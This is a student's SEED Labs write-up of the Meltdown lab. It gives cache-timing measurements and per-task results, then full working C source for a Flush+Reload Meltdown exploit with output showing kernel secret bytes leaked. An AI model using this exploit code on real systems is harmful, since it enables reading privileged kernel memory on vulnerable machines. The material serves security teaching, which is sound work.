## Meltdown

> Warning: This lab doesn't work on computers with AMD cpu

### Task 1:

array[3] and array[7] will have less access time. 

```
[06/21/20]seed@VM:~/Meltdown_Attack$ ./a.out 
Access time for array[0*4096]: 1268 CPU cycles
Access time for array[1*4096]: 248 CPU cycles
Access time for array[2*4096]: 226 CPU cycles
Access time for array[3*4096]: 128 CPU cycles
Access time for array[4*4096]: 246 CPU cycles
Access time for array[5*4096]: 246 CPU cycles
Access time for array[6*4096]: 294 CPU cycles
Access time for array[7*4096]: 108 CPU cycles
Access time for array[8*4096]: 230 CPU cycles
Access time for array[9*4096]: 236 CPU cycles


```

A fair threshold could be 200

### Task 2

Change the threshold to 200

Success rate will be 3/10 

Threshold should be changed to a value ~130

### Task 3

```
[06/23/20]seed@VM:~/Meltdown_Attack$ dmesg | grep 'secret data'
[ 9428.864714] secret data address:f9dc0000
```



### Task 4

It fails due to segmentation fault

### Task 6

```
[06/24/20]seed@VM:~/Meltdown_Attack$ gcc -march=native MeltdownExperiment.c -o me
[06/24/20]seed@VM:~/Meltdown_Attack$ ./me
Memory access violation!
The new value: 1
array[7*4096 + 1024] is in cache.
The Secret = 7.
[06/24/20]seed@VM:~/Meltdown_Attack$ 

```

### Task 7

Simply changing 7 to kernel_data doesn't work.

Using meltdown_asm(), it works at a fair rate (like 2/5)

```
[06/24/20]seed@VM:~/Meltdown_Attack$ ./me
Memory access violation!
array[83*4096 + 1024] is in cache.
The Secret = 83.
[06/24/20]seed@VM:~/Meltdown_Attack$ ./me
Memory access violation!
array[83*4096 + 1024] is in cache.
The Secret = 83.
```

I try to change the code to make it loop for 1000 times, but the result doesn't seem good.

### Task 8

``` C
#include <stdio.h>

#include <stdint.h>

#include <unistd.h>

#include <string.h>

#include <signal.h>

#include <setjmp.h>

#include <fcntl.h>

#include <emmintrin.h>

#include <x86intrin.h>



/*********************** Flush + Reload ************************/

uint8_t array[256*4096];

/* cache hit time threshold assumed*/

#define CACHE_HIT_THRESHOLD (80)

#define DELTA 1024



void flushSideChannel()

{

  int i;



  // Write to array to bring it to RAM to prevent Copy-on-write

  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;



  //flush the values of the array from cache

  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);

}



static int scores[256];



void reloadSideChannelImproved()

{

  int i;

  volatile uint8_t *addr;

  register uint64_t time1, time2;

  int junk = 0;

  for (i = 0; i < 256; i++) {

     addr = &array[i * 4096 + DELTA];

     time1 = __rdtscp(&junk);

     junk = *addr;

     time2 = __rdtscp(&junk) - time1;

     if (time2 <= CACHE_HIT_THRESHOLD)

        scores[i]++; /* if cache hit, add 1 for this value */

  }

}

/*********************** Flush + Reload ************************/



void meltdown_asm(unsigned long kernel_data_addr)

{

   char kernel_data = 0;

   

   // Give eax register something to do

   asm volatile(

       ".rept 400;"                

       "add $0x141, %%eax;"

       ".endr;"                    

    

       :

       :

       : "eax"

   ); 

    

   // The following statement will cause an exception

   kernel_data = *(char*)kernel_data_addr;  

   array[kernel_data * 4096 + DELTA] += 1;              

}



// signal handler

static sigjmp_buf jbuf;

static void catch_segv()

{

   siglongjmp(jbuf, 1);

}



int main()

{

  int i, j, ret = 0;

  int round = 0;





  // Register signal handler

  signal(SIGSEGV, catch_segv);

  

  for(round = 0;round < 8;round++){

  int fd = open("/proc/secret_data", O_RDONLY);

  if (fd < 0) {

    perror("open");

    return -1;

  }

  

  memset(scores, 0, sizeof(scores));

  flushSideChannel();

  

	  

  // Retry 1000 times on the same address.

  for (i = 0; i < 1000; i++) {

	ret = pread(fd, NULL, 0, 0);

	if (ret < 0) {

	  perror("pread");

	  break;

	}

	

	// Flush the probing array

	for (j = 0; j < 256; j++) 

		_mm_clflush(&array[j * 4096 + DELTA]);



	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000 + 1 * round); }



	reloadSideChannelImproved();

  }

 



  // Find the index with the highest score.

  int max = 0;

  for (i = 0; i < 256; i++) {

	if (scores[max] < scores[i]) max = i;

  }



  printf("The secret value is %d %c\n", max, max);

  printf("The number of hits is %d\n", scores[max]);

  }



  return 0;

}
```

Result:

```
[06/24/20]seed@VM:~/Meltdown_Attack$ ./ma
The secret value is 83 S
The number of hits is 962
The secret value is 69 E
The number of hits is 972
The secret value is 69 E
The number of hits is 970
The secret value is 68 D
The number of hits is 952
The secret value is 76 L
The number of hits is 971
The secret value is 97 a
The number of hits is 970
The secret value is 98 b
The number of hits is 971
The secret value is 115 s
The number of hits is 965

```

